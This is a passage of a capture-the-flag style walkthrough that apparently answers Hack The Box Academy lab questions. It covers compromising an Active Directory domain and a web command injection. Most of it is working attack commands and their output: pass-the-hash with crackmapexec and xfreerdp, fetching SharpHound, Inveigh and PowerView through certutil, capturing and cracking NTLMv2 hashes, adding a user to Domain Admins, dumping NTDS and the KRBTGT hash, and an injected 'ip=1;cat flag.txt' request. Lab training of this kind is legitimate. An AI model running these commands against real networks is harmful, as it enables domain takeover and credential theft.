</span><span id="__span-310-59"><a id="__codelineno-310-59" name="__codelineno-310-59"></a>proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL  -x &#39;reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f&#39; --exec-method smbexec
</span><span id="__span-310-60"><a id="__codelineno-310-60" name="__codelineno-310-60"></a>
</span><span id="__span-310-61"><a id="__codelineno-310-61" name="__codelineno-310-61"></a># Now we can access the target via RDP:
</span><span id="__span-310-62"><a id="__codelineno-310-62" name="__codelineno-310-62"></a>proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /cert-ignore
</span><span id="__span-310-63"><a id="__codelineno-310-63" name="__codelineno-310-63"></a>
</span><span id="__span-310-64"><a id="__codelineno-310-64" name="__codelineno-310-64"></a># Finally, open PowerShell as Admin and read the file.
</span></code></pre></div></td></tr></table></div>
<p>Results:  exc3ss1ve_adm1n_r1ights!</p>
<p><strong>Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-311-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-311-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-311-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-311-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-311-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-311-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-311-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-311-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-311-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-311-10">10</a></span>
<span class="normal"><a href="#__codelineno-311-11">11</a></span>
<span class="normal"><a href="#__codelineno-311-12">12</a></span>
<span class="normal"><a href="#__codelineno-311-13">13</a></span>
<span class="normal"><a href="#__codelineno-311-14">14</a></span>
<span class="normal"><a href="#__codelineno-311-15">15</a></span>
<span class="normal"><a href="#__codelineno-311-16">16</a></span>
<span class="normal"><a href="#__codelineno-311-17">17</a></span>
<span class="normal"><a href="#__codelineno-311-18">18</a></span>
<span class="normal"><a href="#__codelineno-311-19">19</a></span>
<span class="normal"><a href="#__codelineno-311-20">20</a></span>
<span class="normal"><a href="#__codelineno-311-21">21</a></span>
<span class="normal"><a href="#__codelineno-311-22">22</a></span>
<span class="normal"><a href="#__codelineno-311-23">23</a></span>
<span class="normal"><a href="#__codelineno-311-24">24</a></span>
<span class="normal"><a href="#__codelineno-311-25">25</a></span>
<span class="normal"><a href="#__codelineno-311-26">26</a></span>
<span class="normal"><a href="#__codelineno-311-27">27</a></span>
<span class="normal"><a href="#__codelineno-311-28">28</a></span>
<span class="normal"><a href="#__codelineno-311-29">29</a></span>
<span class="normal"><a href="#__codelineno-311-30">30</a></span>
<span class="normal"><a href="#__codelineno-311-31">31</a></span>
<span class="normal"><a href="#__codelineno-311-32">32</a></span>
<span class="normal"><a href="#__codelineno-311-33">33</a></span>
<span class="normal"><a href="#__codelineno-311-34">34</a></span>
<span class="normal"><a href="#__codelineno-311-35">35</a></span>
<span class="normal"><a href="#__codelineno-311-36">36</a></span>
<span class="normal"><a href="#__codelineno-311-37">37</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-311-1"><a id="__codelineno-311-1" name="__codelineno-311-1"></a><span class="c"># We have obtained a foothold with administrative rights on the MS01 host (172.16.7.50). From here, we will use SharpHound to collect Active Directory data. First, we transfer the SharpHound executable from our Kali machine to the Parrot pivot machine.</span>
</span><span id="__span-311-2"><a id="__codelineno-311-2" name="__codelineno-311-2"></a>
</span><span id="__span-311-3"><a id="__codelineno-311-3" name="__codelineno-311-3"></a><span class="c"># On the Kali machine:</span>
</span><span id="__span-311-4"><a id="__codelineno-311-4" name="__codelineno-311-4"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">9001</span>
</span><span id="__span-311-5"><a id="__codelineno-311-5" name="__codelineno-311-5"></a>
</span><span id="__span-311-6"><a id="__codelineno-311-6" name="__codelineno-311-6"></a><span class="c"># On the Parrot pivot machine:</span>
</span><span id="__span-311-7"><a id="__codelineno-311-7" name="__codelineno-311-7"></a><span class="nb">wget </span><span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">140</span><span class="p">:</span><span class="n">9001</span><span class="p">/</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-311-8"><a id="__codelineno-311-8" name="__codelineno-311-8"></a>
</span><span id="__span-311-9"><a id="__codelineno-311-9" name="__codelineno-311-9"></a><span class="c"># Serve the SharpHound executable from the Parrot pivot machine:</span>
</span><span id="__span-311-10"><a id="__codelineno-311-10" name="__codelineno-311-10"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">9001</span>
</span><span id="__span-311-11"><a id="__codelineno-311-11" name="__codelineno-311-11"></a>
</span><span id="__span-311-12"><a id="__codelineno-311-12" name="__codelineno-311-12"></a><span class="c"># From the MS01 host (172.16.7.50) via RDP:</span>
</span><span id="__span-311-13"><a id="__codelineno-311-13" name="__codelineno-311-13"></a><span class="n">proxychains</span> <span class="n">xfreerdp</span> <span class="p">/</span><span class="n">v</span><span class="p">:</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">7</span><span class="p">.</span><span class="n">50</span> <span class="p">/</span><span class="n">u</span><span class="p">:</span><span class="n">mssqlsvc</span> <span class="p">/</span><span class="n">pth</span><span class="p">:</span><span class="n">8c9555327d95f815987c0d81238c7660</span> <span class="p">/</span><span class="n">cert-ignore</span>
</span><span id="__span-311-14"><a id="__codelineno-311-14" name="__codelineno-311-14"></a>
</span><span id="__span-311-15"><a id="__codelineno-311-15" name="__codelineno-311-15"></a><span class="c"># Open a PowerShell terminal and download the SharpHound executable:</span>
</span><span id="__span-311-16"><a id="__codelineno-311-16" name="__codelineno-311-16"></a><span class="n">powershell</span>
</span><span id="__span-311-17"><a id="__codelineno-311-17" name="__codelineno-311-17"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">7</span><span class="p">.</span><span class="n">240</span><span class="p">:</span><span class="n">9001</span><span class="p">/</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-311-18"><a id="__codelineno-311-18" name="__codelineno-311-18"></a>
</span><span id="__span-311-19"><a id="__codelineno-311-19" name="__codelineno-311-19"></a><span class="c"># Run the SharpHound collector on MS01 (172.16.7.50):</span>
</span><span id="__span-311-20"><a id="__codelineno-311-20" name="__codelineno-311-20"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span> <span class="p">-</span><span class="n">-zipfilename</span> <span class="n">enum</span>
</span><span id="__span-311-21"><a id="__codelineno-311-21" name="__codelineno-311-21"></a>
</span><span id="__span-311-22"><a id="__codelineno-311-22" name="__codelineno-311-22"></a><span class="c"># Save the collected data in the `C:\Users\Public\Downloads` folder. Configure the folder to be shared on the network. Once shared, download the collected data to the Kali machine:</span>
</span><span id="__span-311-23"><a id="__codelineno-311-23" name="__codelineno-311-23"></a><span class="n">proxychains</span> <span class="n">smbclient</span> <span class="s2">&quot;//172.16.7.50/Users&quot;</span> <span class="n">-U</span> <span class="s2">&quot;inlanefreight\BR086&quot;</span>
</span><span id="__span-311-24"><a id="__codelineno-311-24" name="__codelineno-311-24"></a><span class="nb">cd </span><span class="n">Public</span>
</span><span id="__span-311-25"><a id="__codelineno-311-25" name="__codelineno-311-25"></a><span class="nb">cd </span><span class="n">Downloads</span>
</span><span id="__span-311-26"><a id="__codelineno-311-26" name="__codelineno-311-26"></a><span class="n">get</span> <span class="n">file_enum</span><span class="p">.</span><span class="n">zip</span>
</span><span id="__span-311-27"><a id="__codelineno-311-27" name="__codelineno-311-27"></a>
</span><span id="__span-311-28"><a id="__codelineno-311-28" name="__codelineno-311-28"></a><span class="c"># Open BloodHound for analysis:</span>
</span><span id="__span-311-29"><a id="__codelineno-311-29" name="__codelineno-311-29"></a><span class="c"># In one terminal, start the Neo4j database:</span>
</span><span id="__span-311-30"><a id="__codelineno-311-30" name="__codelineno-311-30"></a><span class="n">sudo</span> <span class="n">neo4j</span> <span class="n">console</span>
</span><span id="__span-311-31"><a id="__codelineno-311-31" name="__codelineno-311-31"></a>
</span><span id="__span-311-32"><a id="__codelineno-311-32" name="__codelineno-311-32"></a><span class="c"># In another terminal, launch BloodHound:</span>
</span><span id="__span-311-33"><a id="__codelineno-311-33" name="__codelineno-311-33"></a><span class="n">bloodhound</span>
</span><span id="__span-311-34"><a id="__codelineno-311-34" name="__codelineno-311-34"></a>
</span><span id="__span-311-35"><a id="__codelineno-311-35" name="__codelineno-311-35"></a><span class="c"># Upload the collected data file (file_enum.zip) to BloodHound.</span>
</span><span id="__span-311-36"><a id="__codelineno-311-36" name="__codelineno-311-36"></a>
</span><span id="__span-311-37"><a id="__codelineno-311-37" name="__codelineno-311-37"></a><span class="c"># Set `DOMAIN.ADMINS` as the starting node for analysis. In the Node tab, click on &quot;Inbound Control Rights&quot; &gt; &quot;Explicit Objects Controllers&quot; and identify the user `CT059`.</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: CT059</p>
<p><strong>Crack this user's password hash and submit the cleartext password as your answer.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-312-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-312-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-312-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-312-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-312-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-312-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-312-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-312-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-312-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-312-10">10</a></span>
<span class="normal"><a href="#__codelineno-312-11">11</a></span>
<span class="normal"><a href="#__codelineno-312-12">12</a></span>
<span class="normal"><a href="#__codelineno-312-13">13</a></span>
<span class="normal"><a href="#__codelineno-312-14">14</a></span>
<span class="normal"><a href="#__codelineno-312-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-312-1"><a id="__codelineno-312-1" name="__codelineno-312-1"></a><span class="c"># Upload Inveigh.exe to the MS01 machine:</span>
</span><span id="__span-312-2"><a id="__codelineno-312-2" name="__codelineno-312-2"></a><span class="c"># From the Parrot pivot machine (172.16.7.240), start a Python HTTP server:</span>
</span><span id="__span-312-3"><a id="__codelineno-312-3" name="__codelineno-312-3"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">9001</span>
</span><span id="__span-312-4"><a id="__codelineno-312-4" name="__codelineno-312-4"></a><span class="c"># From the MS01 host machine (172.16.7.50), download the file using CertUtil:</span>
</span><span id="__span-312-5"><a id="__codelineno-312-5" name="__codelineno-312-5"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">7</span><span class="p">.</span><span class="n">240</span><span class="p">:</span><span class="n">9001</span><span class="p">/</span><span class="n">Inveigh</span><span class="p">.</span><span class="n">exe</span> <span class="n">Inveigh</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-312-6"><a id="__codelineno-312-6" name="__codelineno-312-6"></a>
</span><span id="__span-312-7"><a id="__codelineno-312-7" name="__codelineno-312-7"></a><span class="c"># Run Inveigh.exe on the MS01 host machine (172.16.7.50):</span>
</span><span id="__span-312-8"><a id="__codelineno-312-8" name="__codelineno-312-8"></a><span class="p">.\</span><span class="n">Inveigh</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-312-9"><a id="__codelineno-312-9" name="__codelineno-312-9"></a>
</span><span id="__span-312-10"><a id="__codelineno-312-10" name="__codelineno-312-10"></a><span class="c"># After some time, observe the captured NTLMv2 hash:</span>
</span><span id="__span-312-11"><a id="__codelineno-312-11" name="__codelineno-312-11"></a><span class="p">[+]</span> <span class="n">SMB</span><span class="p">(</span><span class="n">445</span><span class="p">)</span> <span class="n">NTLMv2</span> <span class="n">captured</span> <span class="k">for</span> <span class="p">[</span><span class="n">INLANEFREIGHT</span><span class="p">\</span><span class="n">CT059</span><span class="p">]</span> <span class="n">from</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">7</span><span class="p">.</span><span class="n">3</span> <span class="p">(</span><span class="n">DC01</span><span class="p">):</span><span class="n">51255</span><span class="p">:</span>
</span><span id="__span-312-12"><a id="__codelineno-312-12" name="__codelineno-312-12"></a><span class="n">CT059</span><span class="p">::</span><span class="n">INLANEFREIGHT</span><span class="p">:</span><span class="n">12263838B200FD3E</span><span class="p">:</span><span class="n">3EE6EA4C91EC7FB8A095770E051B8376</span><span class="p">:</span><span class="n">0101000000000000E08DF4460462DB01364B979606FF3B0B0000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800E08DF4460462DB01060004000200000008003000300000000000000000000000002000004CEB572AE37933B1CF59600EAD9B1A90422724811037093D434F05A8D1980E0E0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000</span>
</span><span id="__span-312-13"><a id="__codelineno-312-13" name="__codelineno-312-13"></a>
</span><span id="__span-312-14"><a id="__codelineno-312-14" name="__codelineno-312-14"></a><span class="c"># Crack the captured NTLMv2 hash using Hashcat:</span>
</span><span id="__span-312-15"><a id="__codelineno-312-15" name="__codelineno-312-15"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">5600</span> <span class="n">CT059</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: charlie1</p>
<p><strong>Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-313-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-313-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-313-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-313-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-313-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-313-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-313-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-313-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-313-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-313-10">10</a></span>
<span class="normal"><a href="#__codelineno-313-11">11</a></span>
<span class="normal"><a href="#__codelineno-313-12">12</a></span>
<span class="normal"><a href="#__codelineno-313-13">13</a></span>
<span class="normal"><a href="#__codelineno-313-14">14</a></span>
<span class="normal"><a href="#__codelineno-313-15">15</a></span>
<span class="normal"><a href="#__codelineno-313-16">16</a></span>
<span class="normal"><a href="#__codelineno-313-17">17</a></span>
<span class="normal"><a href="#__codelineno-313-18">18</a></span>
<span class="normal"><a href="#__codelineno-313-19">19</a></span>
<span class="normal"><a href="#__codelineno-313-20">20</a></span>
<span class="normal"><a href="#__codelineno-313-21">21</a></span>
<span class="normal"><a href="#__codelineno-313-22">22</a></span>
<span class="normal"><a href="#__codelineno-313-23">23</a></span>
<span class="normal"><a href="#__codelineno-313-24">24</a></span>
<span class="normal"><a href="#__codelineno-313-25">25</a></span>
<span class="normal"><a href="#__codelineno-313-26">26</a></span>
<span class="normal"><a href="#__codelineno-313-27">27</a></span>
<span class="normal"><a href="#__codelineno-313-28">28</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-313-1"><a id="__codelineno-313-1" name="__codelineno-313-1"></a><span class="c1"># First, we test our connection:</span>
</span><span id="__span-313-2"><a id="__codelineno-313-2" name="__codelineno-313-2"></a>proxychains<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.7.3<span class="w"> </span>-u<span class="w"> </span>CT059<span class="w"> </span>-p<span class="w"> </span>charlie1<span class="w"> </span>-d<span class="w"> </span>INLANEFREIGHT.LOCAL
</span><span id="__span-313-3"><a id="__codelineno-313-3" name="__codelineno-313-3"></a>
</span><span id="__span-313-4"><a id="__codelineno-313-4" name="__codelineno-313-4"></a><span class="c1"># We observe that this user has a GenericAll ACL over the domain, meaning they have the ability to add another user to the Domain Admins group, for example.</span>
</span><span id="__span-313-5"><a id="__codelineno-313-5" name="__codelineno-313-5"></a>
</span><span id="__span-313-6"><a id="__codelineno-313-6" name="__codelineno-313-6"></a><span class="c1"># To proceed, we first open a terminal session on MS01. For this, we need to modify the registry:</span>
</span><span id="__span-313-7"><a id="__codelineno-313-7" name="__codelineno-313-7"></a>proxychains<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.7.50<span class="w"> </span>-u<span class="w"> </span>mssqlsvc<span class="w"> </span>-H<span class="w"> </span>8c9555327d95f815987c0d81238c7660<span class="w"> </span>-d<span class="w"> </span>INLANEFREIGHT.LOCAL<span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f&#39;</span><span class="w"> </span>--exec-method<span class="w"> </span>smbexec
</span><span id="__span-313-8"><a id="__codelineno-313-8" name="__codelineno-313-8"></a>
</span><span id="__span-313-9"><a id="__codelineno-313-9" name="__codelineno-313-9"></a><span class="c1"># With the registry modified, we can now establish an RDP connection:</span>
</span><span id="__span-313-10"><a id="__codelineno-313-10" name="__codelineno-313-10"></a>proxychains<span class="w"> </span>xfreerdp<span class="w"> </span>/v:172.16.7.50<span class="w"> </span>/u:mssqlsvc<span class="w"> </span>/pth:8c9555327d95f815987c0d81238c7660<span class="w"> </span>/cert-ignore
</span><span id="__span-313-11"><a id="__codelineno-313-11" name="__codelineno-313-11"></a>
</span><span id="__span-313-12"><a id="__codelineno-313-12" name="__codelineno-313-12"></a><span class="c1"># Once connected, open a PowerShell terminal as Administrator and download the PowerView.ps1 module from the Parrot pivot machine (172.16.7.240):</span>
</span><span id="__span-313-13"><a id="__codelineno-313-13" name="__codelineno-313-13"></a>certutil<span class="w"> </span>-urlcache<span class="w"> </span>-split<span class="w"> </span>-f<span class="w"> </span>http://172.16.7.240:9001/PowerView.ps1<span class="w"> </span>PowerView.ps1
</span><span id="__span-313-14"><a id="__codelineno-313-14" name="__codelineno-313-14"></a>
</span><span id="__span-313-15"><a id="__codelineno-313-15" name="__codelineno-313-15"></a><span class="c1"># Using the PowerView module, the user CT059 will add AB920 to the Domain Admins group:</span>
</span><span id="__span-313-16"><a id="__codelineno-313-16" name="__codelineno-313-16"></a><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ConvertTo-SecureString<span class="w"> </span><span class="s1">&#39;charlie1&#39;</span><span class="w"> </span>-AsPlainText<span class="w"> </span>-Force
</span><span id="__span-313-17"><a id="__codelineno-313-17" name="__codelineno-313-17"></a><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">&#39;INLANEFREIGHT\CT059&#39;</span>,<span class="w"> </span><span class="nv">$SecPassword</span><span class="o">)</span>
</span><span id="__span-313-18"><a id="__codelineno-313-18" name="__codelineno-313-18"></a>Import-Module<span class="w"> </span>.<span class="se">\P</span>owerView.ps1
</span><span id="__span-313-19"><a id="__codelineno-313-19" name="__codelineno-313-19"></a>Add-DomainGroupMember<span class="w"> </span>-Identity<span class="w"> </span><span class="s1">&#39;Domain Admins&#39;</span><span class="w"> </span>-Members<span class="w"> </span><span class="s1">&#39;AB920&#39;</span><span class="w"> </span>-Credential<span class="w"> </span><span class="nv">$Cred</span>
</span><span id="__span-313-20"><a id="__codelineno-313-20" name="__codelineno-313-20"></a>
</span><span id="__span-313-21"><a id="__codelineno-313-21" name="__codelineno-313-21"></a><span class="c1"># Now, with the AB920 account in the Domain Admins group, we can proceed to dump the NTDS:</span>
</span><span id="__span-313-22"><a id="__codelineno-313-22" name="__codelineno-313-22"></a>proxychains<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.7.3<span class="w"> </span>-u<span class="w"> </span>AB920<span class="w"> </span>-p<span class="w"> </span>weasal<span class="w"> </span>-d<span class="w"> </span>INLANEFREIGHT.LOCAL<span class="w"> </span>--ntds
</span><span id="__span-313-23"><a id="__codelineno-313-23" name="__codelineno-313-23"></a>
</span><span id="__span-313-24"><a id="__codelineno-313-24" name="__codelineno-313-24"></a><span class="c1"># Confirming that the connection is successful:</span>
</span><span id="__span-313-25"><a id="__codelineno-313-25" name="__codelineno-313-25"></a>proxychains<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.7.3<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;234a798328eb83fda24119597ffba70b&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami&#39;</span><span class="w"> </span>--exec-method<span class="w"> </span>smbexec
</span><span id="__span-313-26"><a id="__codelineno-313-26" name="__codelineno-313-26"></a>
</span><span id="__span-313-27"><a id="__codelineno-313-27" name="__codelineno-313-27"></a><span class="c1"># Finally, dumping the flag:</span>
</span><span id="__span-313-28"><a id="__codelineno-313-28" name="__codelineno-313-28"></a>proxychains<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.7.3<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;234a798328eb83fda24119597ffba70b&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;type c:\Users\Administrator\Desktop\flag.txt&#39;</span><span class="w"> </span>--exec-method<span class="w"> </span>smbexec
</span></code></pre></div></td></tr></table></div>
<p>Results: acLs_f0r_th3_w1n!</p>
<p><strong>Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-314-1">1</a></span>
<span class="normal"><a href="#__codelineno-314-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-314-1"><a id="__codelineno-314-1" name="__codelineno-314-1"></a>proxychains crackmapexec smb 172.16.7.3  -u AB920 -p weasal -d INLANEFREIGHT.LOCAL --ntds
</span><span id="__span-314-2"><a id="__codelineno-314-2" name="__codelineno-314-2"></a># Krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: 
</span></code></pre></div></td></tr></table></div>
<p>Results: 7eba70412d81c1cd030d72a3e8dbe05f</p>
<h2 id="using-web-proxies"><a href="https://academy.hackthebox.com/module/details/110">Using Web Proxies</a></h2>
<h3 id="intercepting-web-requests">Intercepting Web Requests</h3>
<p>Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-315-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-315-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-315-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-315-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-315-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-315-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-315-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-315-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-315-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-315-10">10</a></span>
<span class="normal"><a href="#__codelineno-315-11">11</a></span>
<span class="normal"><a href="#__codelineno-315-12">12</a></span>
<span class="normal"><a href="#__codelineno-315-13">13</a></span>
<span class="normal"><a href="#__codelineno-315-14">14</a></span>
<span class="normal"><a href="#__codelineno-315-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-315-1"><a id="__codelineno-315-1" name="__codelineno-315-1"></a># After intercepting the request, we enter:
</span><span id="__span-315-2"><a id="__codelineno-315-2" name="__codelineno-315-2"></a>POST /ping HTTP/1.1
</span><span id="__span-315-3"><a id="__codelineno-315-3" name="__codelineno-315-3"></a>Host: 94.237.59.24:51204
</span><span id="__span-315-4"><a id="__codelineno-315-4" name="__codelineno-315-4"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-315-5"><a id="__codelineno-315-5" name="__codelineno-315-5"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-315-6"><a id="__codelineno-315-6" name="__codelineno-315-6"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-315-7"><a id="__codelineno-315-7" name="__codelineno-315-7"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-315-8"><a id="__codelineno-315-8" name="__codelineno-315-8"></a>Content-Type: application/x-www-form-urlencoded
</span><span id="__span-315-9"><a id="__codelineno-315-9" name="__codelineno-315-9"></a>Content-Length: 17
</span><span id="__span-315-10"><a id="__codelineno-315-10" name="__codelineno-315-10"></a>Origin: http://94.237.59.24:51204
</span><span id="__span-315-11"><a id="__codelineno-315-11" name="__codelineno-315-11"></a>Connection: close
</span><span id="__span-315-12"><a id="__codelineno-315-12" name="__codelineno-315-12"></a>Referer: http://94.237.59.24:51204/
</span><span id="__span-315-13"><a id="__codelineno-315-13" name="__codelineno-315-13"></a>Upgrade-Insecure-Requests: 1
</span><span id="__span-315-14"><a id="__codelineno-315-14" name="__codelineno-315-14"></a>
</span><span id="__span-315-15"><a id="__codelineno-315-15" name="__codelineno-315-15"></a>ip=1;cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>The response:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-316-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-316-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-316-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-316-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-316-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-316-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-316-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-316-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-316-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-316-10">10</a></span>
<span class="normal"><a href="#__codelineno-316-11">11</a></span>
<span class="normal"><a href="#__codelineno-316-12">12</a></span>
<span class="normal"><a href="#__codelineno-316-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-316-1"><a id="__codelineno-316-1" name="__codelineno-316-1"></a>HTTP/1.1 200 OK
</span><span id="__span-316-2"><a id="__codelineno-316-2" name="__codelineno-316-2"></a>X-Powered-By: Express
</span><span id="__span-316-3"><a id="__codelineno-316-3" name="__codelineno-316-3"></a>Date: Sun, 20 Oct 2024 18:17:29 GMT
</span><span id="__span-316-4"><a id="__codelineno-316-4" name="__codelineno-316-4"></a>Connection: close
</span><span id="__span-316-5"><a id="__codelineno-316-5" name="__codelineno-316-5"></a>Content-Length: 282
</span><span id="__span-316-6"><a id="__codelineno-316-6" name="__codelineno-316-6"></a>
</span><span id="__span-316-7"><a id="__codelineno-316-7" name="__codelineno-316-7"></a>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span id="__span-316-8"><a id="__codelineno-316-8" name="__codelineno-316-8"></a>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms
</span><span id="__span-316-9"><a id="__codelineno-316-9" name="__codelineno-316-9"></a>
</span><span id="__span-316-10"><a id="__codelineno-316-10" name="__codelineno-316-10"></a>--- 127.0.0.1 ping statistics ---
</span><span id="__span-316-11"><a id="__codelineno-316-11" name="__codelineno-316-11"></a>1 packets transmitted, 1 received, 0% packet loss, time 0ms
</span><span id="__span-316-12"><a id="__codelineno-316-12" name="__codelineno-316-12"></a>rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
